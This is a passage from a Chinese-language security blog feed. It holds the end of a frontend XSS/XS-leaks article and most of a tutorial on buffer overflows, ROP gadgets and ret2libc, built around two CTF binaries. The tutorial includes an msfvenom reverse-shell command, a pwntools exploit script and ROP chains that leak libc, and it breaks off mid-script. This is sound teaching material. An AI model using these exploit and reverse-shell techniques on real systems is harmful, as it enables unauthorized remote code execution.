f<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>type<span class=\"token operator\">:</span><span class=\"token string\">'getSelectedText'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>一個簡單的 demo 網頁：<a href=\"https://aszx87410.github.io/demo/mw2021/05-pdf/index.html\">https://aszx87410.github.io/demo/mw2021/05-pdf/index.html</a></p>\n<p>雖然說這個技巧只能用在文字上面，但這種隱藏的功能真是令人興奮。</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>先補充一下，上述的有些攻擊並不是所有環境都適用，例如說有些攻擊需要網站沒有擋 iframe，而拿來身份驗證的 cookie 可能也不能設定 SameSite，否則就會失效，利用 name 來傳 payload 的方法在某些瀏覽器可能也不適用，但我覺得這都不影響這些攻擊的有趣程度。</p>\n<p>文章中有些繞過的部分並沒有寫得很完整，因為我把重點放在「找到至少一種繞過方式」，而不是「寫出所有繞過方式」，想看更完整的繞過技巧可以參考：<a href=\"https://netsec.expert/posts/xss-in-2021/\">Cheatsheet: XSS that works in 2021</a>。</p>\n<p>這篇文章提到的許多技巧，都是我透過打 CTF 學習而來，例如說下載檔案的 XS leaks 從 <a href=\"https://github.com/aszx87410/ctf-writeups/issues/25\">LINE CTF 2021 - Your Note</a>，讀取不同 path 的 cookie 是從 <a href=\"https://github.com/aszx87410/ctf-writeups/issues/19\">DiceCTF 2021 - Web IDE</a> 學到的，Chrome 的隱藏 API 則是在 <a href=\"https://github.com/aszx87410/ctf-writeups/issues/23\">zer0pts CTF 2021 - PDF Generator</a> 學習到的技巧，透過 CTF 讓我看見了不一樣的 Web。</p>\n<p>以上就是我近期學習到的一些與前端相關的知識，每一個都超出了我的想像，希望這篇文章有讓大家感受到我當初的驚訝，覺得：「哇，原來前端還有這些東西，我怎麼都不知道」。</p>\n",
      "date_published": "2021-10-25T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/",
      "title": "PWN 入門 - rop, gadget 是什麼？",
      "content_html": "<!-- summary -->\n<p>摸過兩題 pwn 之後，你發現大多數的題目根本不能輕輕鬆鬆就跳到某個開 shell 的函數或是執行你寫的 shellcode。你看的 writeup 裡都刻了好多奇怪的記憶體位置，連成好大一串 input，他們在幹嘛？今天我們來初探 ROP 與 gadget 的世界。</p>\n<!-- summary -->\n<p>在開始之前，請先閱讀 Reverse 101 的基礎篇：<a href=\"https://tech-blog.cymetrics.io/posts/crystal/reverse-01\"><strong>Reverse Engineering 101 — Part 1</strong></a>，學習 pwn 的時候，了解記憶體分配與程式的運作方式是很重要的。</p>\n<p>如果對 pwn 還沒有點概念的話，也建議先看一下前一篇：<a href=\"https://tech-blog.cymetrics.io/posts/crystal/pwn-intro\"><strong>PWN 入門 - buffer overflow 是什麼？</strong></a></p>\n<h2 id=\"more-shellcode---yabo\"><a class=\"direct-link\" href=\"#more-shellcode---yabo\">#</a> more shellcode - YABO</h2>\n<p>剛玩過一點 shellcode 覺得太單純沒有實感，這次我們來看另一題需要 buffer overflow 才能觸發的 shellcode 題。這是 2021 Hactivitycon CTF 的 YABO，可以到<a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/YABO\">這裡</a>下載。</p>\n<p>這題跑起來之後會起一個 server，你可以偵測電腦開的 port 發現 server 聽在 9999 上，連過去就可以對話。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-run.png\" /><figcaption><p>running yabo</p>\n</figcaption></figure></p>\n<p>我們一樣用 Ghidra 打開來看，不過這裡就省略 server 接收 connection 的部分，直接進到跟 client 對話的 <code>vuln()</code> 函數：</p>\n<pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> param_1<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">char</span> input_buffer <span class=\"token punctuation\">[</span><span class=\"token number\">1024</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>  <span class=\"token class-name\">size_t</span> recv_result<span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>recv_buf<span class=\"token punctuation\">;</span><br>  <br>  recv_buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span><br>  recv_buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>recv_buf <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Memory error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>param_1<span class=\"token punctuation\">,</span><span class=\"token string\">\"What would you like to say?: \"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    recv_result <span class=\"token operator\">=</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>param_1<span class=\"token punctuation\">,</span>recv_buf<span class=\"token punctuation\">,</span><span class=\"token number\">0xeff</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>recv_result <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>recv_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>input_buffer<span class=\"token punctuation\">,</span>recv_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>邏輯很簡單，先用一個 <code>malloc()</code> 得到的 <code>recv_buf</code> 接收 socket 傳過來的內容，如果沒有報錯的話才把內容複製一份到 stack 上的 local buffer。</p>\n<p>看一下保護機制，發現什麼都沒開，表示我們可以用前一題的 shellcode 手法來 RCE，而且記憶體位置固定，所以如果有可以利用的地址或空間就能直接跳過去。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-checksec.png\" /><figcaption><p>checksec</p>\n</figcaption></figure></p>\n<p>這裡沒有像 <code>puts()</code> 一樣可以寫無限多輸入的地方，那程式的弱點在哪？</p>\n<p>答案是：記憶體內容被複製時的空間差異。</p>\n<p>在最後 <code>strcpy(input_buffer,recv_buf);</code> 的地方，<code>recv_buf</code> 的內容被複製一份填到 <code>input_buffer</code> 裡，但是 <code>recv_buf</code> 的大小吃了 0xeff，比 <code>input_buffer</code> 的 1024 大很多，所以如果我們從 client 端送到程式裡的字串大於 1024 ，<code>strcpy()</code> 後就會覆蓋 stack 上的其他空間，最後成功蓋過 return address。</p>\n<p>辨識弱點後就來嘗試蓋過 return address 找到會 segfault 的 offset 吧！</p>\n<p>我們用 gdb 跑起 YABO，這次換一個方法判斷 offset。gdb 有個好用的指令 <code>pattern_create</code> 可以產生出一個任意長度的字串，確保任 4 個 byte 都是 unique 的。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-patterncreate.png\" /><figcaption><p>create pattern</p>\n</figcaption></figure></p>\n<p>讓程式執行起來，然後從 client 端把剛剛產生的送進去，就會在 gdb 裡看到噴出 segfault。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-segfault.png\" /><figcaption><p>segfault</p>\n</figcaption></figure></p>\n<p>在框起來的地方可以看到 segfault 是因為蓋過 return address 所以邏輯跑到了不包含指令的奇怪地方。我們可以繼續用 gdb 的指令 <code>pattern_offset</code> 來快速知道這個被覆蓋的位置是剛剛那一大堆字串的第幾個位元：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-patternoffset.png\" /><figcaption><p>pattern offset</p>\n</figcaption></figure></p>\n<p>這下我們知道要 overflow 的形式就是 <code>'A'*1044 + retaddr</code>，只要把原本的 return address 換成我們寫的 shellcode 的位置就可以啦！</p>\n<h3 id=\"where-to-put-shellcode%3F\"><a class=\"direct-link\" href=\"#where-to-put-shellcode%3F\">#</a> where to put shellcode?</h3>\n<p>不過，我們的 shellcode 要放哪裡呢？因為存放輸入的地方在 stack 上，所以我們沒辦法事先知道 <code>input_buffer</code> 的位置，<code>recv_buf</code> 用的是 heap 空間同樣也沒辦法簡單觀察出來。</p>\n<p>這裡就要介紹一個新的概念：gadget。</p>\n<blockquote>\n<p>當我們沒辦法直接執行自己 inject 進去的指令時，就可以利用這個檔案裡面本來就有的程式片段來湊出我們想執行的功能，這些『片段』就稱為 gadget。</p>\n</blockquote>\n<p>後續在講 ROP(Return Oriented Programming) 的部分時我們會更深入地提到如何建構出完整的 ROP chain 達成 RCE，這裡就先以解題用到的部分讓大家感受一下。</p>\n<p>回到剛剛發生 segfault 的地方，如果你仔細看會發現此時的 <code>esp</code> 跟 <code>edx</code> 都指到的我們剛剛輸入的字串的一部分，也就是說這兩個暫存器裡面的值是我們可以控制的，所以如果我們把 shellcode 放在 <code>esp</code> 跟 <code>edx</code> 的位置，然後找到某個寫著 <code>jmp esp</code> 或 <code>jmp edx</code> 的 gadget，就能把 program control flow 導引到 shellcode 達成 RCE 啦！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-esp.png\" /><figcaption><p>esp</p>\n</figcaption></figure></p>\n<p>更甚，你可以稍微檢視一下 <code>esp</code> 附近的記憶體空間，就會發現在我們剛剛 overflow 的 return address 的下一塊就緊接著  <code>esp</code>！只要能找到可用的 gadget 我們的拼圖就完成了，用 <code>'A'*1044 + gadget + shellcode</code> 就能 RCE！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-espoffset.png\" /><figcaption><p>esp offset</p>\n</figcaption></figure></p>\n<p>找 gadget 可以用 <code>ROPgadget</code> 這個指令：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/yabo-gadget.png\" /><figcaption><p>gadget</p>\n</figcaption></figure></p>\n<p>最後一步就是產生 shellcode 啦！這一次我們要的功能是開一個 reverse shell 的連線到我們的機器，可以用 msfvenom 來完成：<br>\n<code>msfvenom -p linux/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -b '\\x00\\x0A\\x0D' -f python -v sc –e x86/shikata_ga_nai</code></p>\n<p>這裡的 IP 要是 public 的，所以如果你有自己的機器最好，不然也可以用 ngrok 這個工具來暫時創建一個 tunnel，這樣就會獲得一個公開的 domain name 跟 IP 可以使用。把要連線的 IP 跟 PORT 填進去就可以獲得自己專屬的 reverse shell payload 啦！</p>\n<p>另外要注意的是，剛用 msfvenom 的時候有做 payload encoding (<code>–e x86/shikata_ga_nai</code>)，所以 shellcode 實際執行的時候會先把自己 decode 一次，會覆寫到 shellcode 前後一些空間，所以我們通常會在 shellcode 前加一段 nop sled（就是一串 <code>'\\x90'</code> 的空白 padding 而已）來避免影響到前面 return address 等等的部分。</p>\n<p>綜合上面的步驟，我們的 exploit 就完成啦！</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><br><br><span class=\"token comment\">#p = process('./retcheck')</span><br><span class=\"token comment\">#p = remote('127.0.0.1', 9999)</span><br>p<span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'challenge.ctf.games'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32762</span><span class=\"token punctuation\">)</span><br><br>nopsled <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x90\"</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><br><span class=\"token comment\"># generate your own shellcode and insert here!</span><br>sc <span class=\"token operator\">=</span>  <span class=\"token string\">b\"\"</span><br><br><span class=\"token comment\"># 0x080492e2 : jmp esp</span><br>gadget <span class=\"token operator\">=</span> <span class=\"token number\">0x080492e2</span><br>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">1044</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>gadget<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> nopsled <span class=\"token operator\">+</span> sc<br>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"What would you like to say?: \"</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"rop\"><a class=\"direct-link\" href=\"#rop\">#</a> rop</h2>\n<p>ROP (Return Oriented Programming) 不是在討論程式語言跟特性嗎，跟 pwn 有什麼關係？</p>\n<p>還記得我們剛剛為什麼去找 <code>jmp esp</code> 的 gadget 嗎？因為 instruction pointer (eip rip) 指向的是下一個指令的位置，所以我們如果能在檔案中找到想要執行的指令片段，就可以讓 instruction pointer 指到這個片段的地址，進而執行相應的組語指令。</p>\n<p>那要怎麼填充 instruction pointer 呢？在組語中，呼叫 <code>ret</code> 這個指令就會把 stack 上的下一塊記憶體內容放到 instruction pointer，所以我們如果把很多個以 <code>ret</code> 結尾的 gadget 的地址串在一起，就可以組合出一系列的指令，這樣 &quot;return-oriented&quot; 的 pwn 手法，就稱為 ROP chain。</p>\n<p>還是不太懂這是如何運作的？我們用下面幾張圖看看要達成 <code>foo(2,1)</code> 的 ROP chain 跑起來的樣子：</p>\n<p>首先，當記憶體被 overflow，當前的函數跑到 <code>ret</code> 時，等效於 <code>pop rip</code> 將 return address 裡寫的地址（<code>0x507070</code>）寫入 <code>rip</code>，此時 <code>rsp</code> 下移指到下一塊記憶體 <code>0x1</code>。<br>\n程式接下來就會從 <code>0x507070</code> 的指令開始繼續執行。第一步的 <code>pop rax</code> 會從 stack 上再拿一個值下來填到 <code>rax</code> 裡，於是 <code>0x1</code> 就會被放進 <code>rax</code>，<code>rsp</code> 下移指到 <code>0x2</code>。第二步的 <code>pop rdi</code> 同樣道理， <code>0x2</code> 會被放進 <code>rdi</code>，<code>rsp</code> 繼續下移。第三步又遇到 <code>ret</code>，於是下一個 stack 上的值放到 <code>rip</code>，第一個 gadget 執行結束，控制權回到我們的 ROP chain。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/rop-1.png\" /><figcaption><p>gadget #1</p>\n</figcaption></figure></p>\n<p>來到第二個 gadget，第一個指令 <code>mov rax, rsi</code> 將前一步填好的 <code>rax</code> 內容複製一份到 <code>rsi</code>，再來 <code>pop rdx</code> 把 <code>foo()</code> 的記憶體位置填充到 <code>rdx</code>，最後用 <code>ret</code> 結束這個 gadget。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/rop-2.png\" /><figcaption><p>gadget #2</p>\n</figcaption></figure></p>\n<p>這下我們需要的輸入參數都就位了，只要能呼叫 <code>foo()</code> 就成功啦。我們串接的第三個 gadget 就是用 <code>call rdx</code> 來觸發，成功達成執行 <code>foo(2,1)</code> 的目的。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/rop-3.png\" /><figcaption><p>gadget #3</p>\n</figcaption></figure></p>\n<p>在 exploit 的時候，我們就是在利用 gadget 的串接拼湊出想要執行的組語指令，畢竟不能執行外部的 shellcode，只用自己內部的可就沒有問題啦！ROP chain 的威力之強大，我們用下一題讓你看一下。</p>\n<h2 id=\"ret2libc\"><a class=\"direct-link\" href=\"#ret2libc\">#</a> ret2libc</h2>\n<p>一樣來自 2021 Hactivitycon CTF，這題有兩個檔案，第一個是程式的<a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/the_library\">執行檔</a>，第二個是程式的 <a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/libc-2.31.so\">libc .so 檔</a>。</p>\n<p>執行起來會請使用者猜一個隨機數，猜錯會輸出 &quot;wrong&quot; 然後結束。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-run.png\" /><figcaption><p>running the_library</p>\n</figcaption></figure></p>\n<p>有請 Ghidra：</p>\n<pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> iVar1<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">char</span> local_228 <span class=\"token punctuation\">[</span><span class=\"token number\">520</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>    uint local_20<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">int</span> local_1c<span class=\"token punctuation\">;</span><br>    FILE <span class=\"token operator\">*</span>local_18<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">int</span> local_c<span class=\"token punctuation\">;</span><br>    <br>    local_18 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span><br>    local_18 <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/urandom\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>local_18 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                        <span class=\"token comment\">/* WARNING: Subroutine does not return */</span><br>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>local_20<span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>local_18<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>local_18<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span>local_20<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to The Library.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Books:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>local_c <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> local_c <span class=\"token operator\">&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> local_c <span class=\"token operator\">=</span> local_c <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d. %s\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>ulong<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>local_c <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>undefined8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOKS <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>local_c <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I am thinking of a book.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which one is it?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>local_228<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    local_1c <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>local_228<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    iVar1 <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>local_1c <span class=\"token operator\">==</span> iVar1 <span class=\"token operator\">%</span> <span class=\"token number\">5</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Correct!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wrong :(\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>不管是猜對還是猜錯程式都會直接結束，所以我們的重點應該放在危險的 <code>gets(local_228);</code> 這一行。因為 <code>gets()</code> 不限長度，所以我們可以透過比分配的 <code>520</code> 更長的輸入來達到 overflow 的目的。一樣先用 gdb 的 <code>pattern_create</code> 跟 <code>pattern_offset</code> 找到實際 overflow 需要的長度跟 return address 的位置，這次我們就不示範放圖了，大家可以練習自己找找看。</p>\n<p>再來看一下保護機制，這次沒有 shellcode 可以用了，不過也沒有 PIE 所以檔案裡面的函數等位置是固定的，看來是時候用 ROP 一決勝負啦！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-checksec.png\" /><figcaption><p>checksec</p>\n</figcaption></figure></p>\n<p>這裡要用到另一個技巧： ret2libc(return to libc)，也就是透過標準函式庫 libc 裡面的 <code>system()</code> 來做到開 shell。 linux 的程式大多都會用到某一版本的 libc，而這個函式庫會在 binary 要開始跑起來的時候被 load 到記憶體裡面，並將使用到的函數寫到 GOT 表中。因為有 ASLR (Address space layout randomization) 的關係，libc 載入的位置會每次檔案跑起來都會隨機分配，所以我們沒辦法預先知道 libc 會在哪個地址。因此，如果要執行 libc 的函數，我們必須先想辦法洩露出 libc 載入的位置。</p>\n<h3 id=\"leaking-libc\"><a class=\"direct-link\" href=\"#leaking-libc\">#</a> leaking libc</h3>\n<p>哪裡會寫著 libc 函數的位置呢？最直覺的地點就是 GOT 表。</p>\n<p>如果我們能讀取 GOT 表中某一個 libc 函數的位置，就可以透過 libc 函數之間的相對位置找到我們要的 <code>system()</code> 在哪。建構 ROP chain 的方法很簡單，比照前面的範例，要呼叫一個函數，只要把對應的參數位置放到 <code>rdi</code> 跟 <code>rsi</code> 等暫存器，然後跳到函數所在的位置就好了。我們想要『洩露』某個地址，想當然就是用可以印出東西的函數： <code>puts()</code> 跟 <code>printf()</code>，那要洩漏的地址就可以隨便放一個有在 GOT 表的 libc 函數。</p>\n<p>這裡我決定用 <code>puts()</code> 來洩漏 <code>puts()</code> 自己的位置，你可以用前面提過的 <code>ROPgadget</code> 找到 <code>pop rdi</code> gadget 的位置，然後透過觀察 assembly 中的內容得到 <code>puts()</code> 的地址，或是乾脆用 pwntools 的 ELF class：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn inport <span class=\"token operator\">*</span><br><br>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'DEBUG'</span><br><br>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'the_library'</span><span class=\"token punctuation\">)</span><br>poprdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401493</span><br>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><br>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><br>rop <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">552</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>poprdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span></code></pre>\n<p>你可以試著送送看然後接收印出來的東西，看到在框起來的部分有六個印出來的 bytes，這就是我們洩露出 <code>puts()</code> 在 libc 的位置：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/thelib-leak.png\" /><figcaption><p>leak libc</p>\n</figcaption></figure></p>\n<p>小提示，地址都是 8 bytes 的，但如果前面有 <code>'\\x00'</code> 的話就不會印出來，所以雖然我們收到的只有 6 bytes，但要自己一下處理把它變成正常的 8 bytes 格式方便做後續運算：<code>libc = u64(p.recv(8)[:6] + '\\x00\\x00')</code></p>\n<p>可是可是，雖然成功洩漏 libc，但程式結束了呀！要是從來一次不就又會換一次地址了嗎？我們哪裡有機會再 overflow 一次？</p>\n<p>沒錯，所以我們不能讓程式結束。只能輸入一次不夠，我們輸入無限次可以了吧？剛剛的 <code>puts_plt</code> 結束之後，我們的 ROP chain 還可以繼續，我們讓程式『回到 <code>main()</code> 再來一次』不就好了嗎？</p>\n<p>把剛剛的 ROP chain 加一個 gadget，多一個希望：</p>\n<pre class=\"language-python\"><code class=\"language-python\">elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'the_library'</span><span class=\"token punctuation\">)</span><br>poprdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401493</span><br>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><br>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><br>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span><br>rop <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">552</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>poprdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> 